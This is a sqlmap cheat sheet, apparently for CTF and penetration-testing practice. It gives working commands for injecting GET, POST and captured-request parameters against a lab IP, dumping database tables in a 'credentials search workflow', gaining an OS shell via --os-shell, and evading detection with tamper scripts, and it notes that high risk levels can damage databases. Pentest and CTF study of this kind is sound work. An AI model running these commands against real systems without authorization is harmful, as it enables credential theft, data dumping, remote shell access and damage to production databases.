## GET URL Param

```bash
sqlmap -u http://10.10.10.10/debug.php?id=1 -p "id" --dbms=mysql --dump
```

## POST body

```bash
sqlmap -u http://10.10.10.10/login.php --method POST --data "username=blah&password=blah&submitButton=Log+In" -p "password"
```

## Captured request (usually POST/PUT)

Save a burp request to a file named `request.txt`:

```bash
sqlmap -r request.txt -p someparam
```

If there is a `Host:` header, then sqlmap will figure out the target on its own. 

Parameters including cookies should also be detected (probably), but don't rely on this to work.

### Example credentials search workflow:

Get database names:

```bash
sqlmap -r request.txt --dbs
```

Get tables of a database:

```bash
sqlmap -r request.txt -D admin --tables
```

Dump content of a table:

```bash
sqlmap -r request.txt -D "admin" -T users --dump
```


## Common Params
### Parameters you want to test specfically

```bash
-p "param,param2"
```

### Discover databases:
```bash
--dbs
```

### Discover Tables:
```bash
-D "database_name"
--tables
```

### Table content:
```bash
-T <table_name>
--dump
```

### Attempt to gain Shell:
```bash
--os-shell
```

### Specify known database type:
```bash
--dbms=mysql
```

### Risk and level
```bash
--level <int>
--risk <int>
```

This is sadly not all that well documented. But in general `--level` increases the number of requests sent, so the number of test cases for each attack type. Higher `--risk` increases the chance to cause Denial of Service (DoS) or damage database content.

`--level` max is 5

* level 1 default
* level 2 adds HTTP Cookie header testing
* level 3 adds HTTP User-Agent/Referer headers testing
* level 4 ????
* level 5 adds Host header testing

`--risk` max is 3

* risk 1 default
* risk 2 adds heavy time-based SQL query injections
* risk 3 adds OR-based SQL injection tests (might damage database content!)

It should be mentioned that there is no "safe" `--level` or `--risk` to run SQLMap in a production environment. You can always cause damage depending on how poorly the API is coded by the developers.


### Get rid of cached session data

Sqlmap tends to cache a lot of data, this might be annoying if there was a false positive or if you changed your captured request file. Do this to get rid of it:

```bash
--flush-session
--fresh-queries
```

### (Burp) Proxy
```bash
--proxy http://localhost:8080
```

### Technique

* Stacked queries (S)
* Union query based (U)
* Error based (E) 
* Inline queries (I)
* Boolean blind (B)
* Time based blind (T)

Specify single technique or technique order

```bash
--technique U
--technique=BEUSTQ
```

For union based attacks you can specify the number of unions cols to test if the default is too small:

```bash
--union-cols=11
--union-cols=1-20
```

### Cookie
```default
--cookie "cookiename=
--cookie "cookiename=cookieprefix"
```

### Unicode Nonsense

CTFs sometimes do this in order to make it harder for you, they throw in some weird characters which are hard to work with on a utf-8 shell. One of the following parameters might help.

Convert output to hex during retrieval:
```bash
--hex
```

Redump entries having unknown character marker (?)
```bash
--repair
```

Character encoding for data retrieval
```bash
--encoding=
```

### Detection Evasion Using Tamper Scripts

```bash
--tamper=charencode
--tamper=charencode,appendnullbyte,escapequotes
```

### Before and after injection point

If you consistently want to add some string data before (prefix) or after (suffix) the injected paylods, then use these options. For example some brackets that need to be opened/closed to make the injection work.

```bash
--prefix "<str>"
--suffix "<str>"
```
